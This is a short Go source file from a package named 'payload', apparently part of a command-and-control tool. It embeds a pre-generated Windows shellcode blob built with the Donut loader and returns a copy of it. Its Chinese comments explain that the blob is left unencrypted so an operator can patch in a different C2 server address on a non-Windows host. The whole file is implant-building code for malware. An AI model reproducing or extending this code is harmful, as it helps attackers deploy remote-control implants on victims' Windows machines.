package payload

import (
	"fmt"

	_ "embed"
)

// 由 scripts/gen-premade-windows-shellcode.ps1 在 Windows 上生成：对当前 data/stubs/windows_x64.exe
// 运行 Donut -a2 -e1（无实例/模块对称加密），使内嵌 PE 在 .bin 中明文存在，便于在非 Windows 服务端用 PatchC2Embed 改 C2。
//
//go:embed premade/windows_amd64_sc_e1.bin
var embeddedPremadeWindowsSCE1 []byte

func loadPremadeWindowsShellcodeE1() ([]byte, error) {
	if len(embeddedPremadeWindowsSCE1) < 4096 {
		return nil, fmt.Errorf("预置 Windows 壳代码缺失或过小：请在 Windows 上执行 scripts/gen-premade-windows-shellcode.ps1 后重新编译")
	}
	b := make([]byte, len(embeddedPremadeWindowsSCE1))
	copy(b, embeddedPremadeWindowsSCE1)
	return b, nil
}
